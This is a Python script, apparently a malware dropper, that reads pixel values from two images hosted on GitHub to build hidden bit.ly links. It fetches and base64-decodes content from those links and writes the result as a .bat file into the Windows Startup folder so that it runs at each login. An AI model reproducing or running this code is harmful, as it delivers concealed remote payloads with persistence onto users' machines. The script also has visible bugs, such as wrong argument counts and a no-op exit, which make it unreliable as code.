from PIL import Image
import requests
import io
import platform
import base64

# OS determination
runningOS = platform.system().lower()
detectedOS = ""
if runningOS == "linux" or runningOS == "linux2":
    exit
elif runningOS == "windows":
    detectedOS = "windows"
elif runningOS == "darwin":
    detectedOS = "mac"

# Dictionary of headers for Windows, Mac, and Linux
headers_dict = {'windows': {"Connection": "keep-alive",
                            "Upgrade-Insecure-Requests": "1",
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36",
                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                            "Sec-Fetch-Site": "same-origin",
                            "Sec-Fetch-Mode": "navigate",
                            "Sec-Fetch-User": "?1",
                            "Sec-Fetch-Dest": "document",
                            "Referer": "https://www.google.com/",
                            "Accept-Encoding": "gzip, deflate, br",
                            "Accept-Language": "en-US,en;q=0.9"}, 'darwin': {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0",
                                                                             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                                                                             "Accept-Language": "en-US,en;q=0.5",
                                                                             "Referer": "https://www.google.com/",
                                                                             "DNT": "1",
                                                                             "Connection": "keep-alive",
                                                                             "Upgrade-Insecure-Requests": "1"}, 'linux': {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0",
                                                                                                                          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                                                                                                                          "Accept-Language": "en-US,en;q=0.5",
                                                                                                                          "Accept-Encoding": "gzip, deflate, br",
                                                                                                                          "Referer": "https://www.google.com/",
                                                                                                                          "DNT": "1",
                                                                                                                          "Connection": "keep-alive",
                                                                                                                          "Upgrade-Insecure-Requests": "1"}}

# User Agent Creation
userAgent = headers_dict.get(runningOS)

# Web Request


def GetImage(url):
    response = requests.get(url, headers=userAgent)
    imageGuts = io.BytesIO(response.content)
    img = Image.open(imageGuts)
    return img


# Drizzt Image
drizzt = GetImage(
    "https://raw.githubusercontent.com/BuriedButBreathing/AcidArrow/master/Assets/9S0xglm.png?raw=true", 406, 306)
di = drizzt.load()
dp = list(di[406, 306])
dp.remove(255)
print(dp)

# Kaladin Image
kaladin = GetImage(
    "https://raw.githubusercontent.com/BuriedButBreathing/AcidArrow/master/Assets/t3lGOWr.png?raw=true", 500, 787)
ki = kaladin.load()
kp = list(ki[500, 787])
kp.remove(255)
print(kp)
print(dp)

# URI construction
uri1 = chr(dp[0]) + chr(dp[2]) + chr(kp[1]) + chr((dp[2]+3)) + \
    chr((kp[0]+4)) + chr(kp[0]) + chr((kp[0]-4))
uri2 = chr((dp[0]+1)) + chr((kp[1]-5)) + chr((dp[1]+1)) + \
    chr((dp[0]-1)) + chr(dp[1]) + chr(dp[1]) + chr((dp[2]-2))

u1 = 'https://bit.ly/' + uri1
u2 = 'https://bit.ly/' + uri2

# Command Retrieval
firstHalf = requests.get(u1, userAgent)
fh = firstHalf.content[::-1]
secondHalf = requests.get(u2, userAgent)
sh = secondHalf.content[::-1]
cs = fh + sh

# Payload Drop
r = base64.b64decode(cs)
with open('C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/helloworld.bat', 'wb') as f:
    f.write(r)
